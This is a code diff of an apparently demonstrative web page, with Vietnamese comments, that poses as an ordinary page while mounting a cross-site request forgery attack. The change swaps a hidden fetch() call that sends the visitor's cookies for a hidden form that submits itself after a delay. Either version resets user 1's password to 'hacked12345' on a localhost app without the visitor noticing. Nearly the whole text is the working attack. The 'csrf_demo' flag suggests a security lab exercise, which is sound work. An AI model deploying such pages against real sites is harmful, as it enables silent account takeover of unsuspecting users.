@@ -7,32 +7,20 @@
     <h1>Trang web bình thường</h1>
     <p>Người dùng đang đọc nội dung...</p>
     
-    <!-- CSRF Attack bằng AJAX - Hoàn toàn ẩn -->
+    <!-- CSRF Attack bằng form ẩn tự động submit -->
+    <form id="csrf-form" action="http://localhost:3000/users/1" method="POST" style="display:none;">
+      <input type="hidden" name="_method" value="PATCH">
+      <input type="hidden" name="user[password]" value="hacked12345">
+      <input type="hidden" name="user[password_confirmation]" value="hacked12345">
+      <input type="hidden" name="csrf_demo" value="true">
+    </form>
+    
     <script>
-        // CSRF Attack sử dụng AJAX
-        function performCSRFAttack() {
-            const formData = new FormData();
-            formData.append('_method', 'PATCH');
-            formData.append('user[password]', 'hacked12345');
-            formData.append('user[password_confirmation]', 'hacked12345');
-            formData.append('csrf_demo', 'true');
-            
-            fetch('http://localhost:3000/users/1', {
-                method: 'POST',
-                body: formData,
-                credentials: 'include' // Gửi cookies
-            })
-            .then(response => {
-                console.log('CSRF attack thành công!');
-                // Không redirect, user không biết gì
-            })
-            .catch(error => {
-                console.log('CSRF attack failed:', error);
-            });
-        }
-        
-        // Thực hiện attack sau 2 giây
-        setTimeout(performCSRFAttack, 2000);
+        // Tự động submit form sau 2 giây
+        setTimeout(function() {
+            console.log('Thực hiện CSRF attack...');
+            document.getElementById('csrf-form').submit();
+        }, 600);
     </script>
     
     <div class="content">
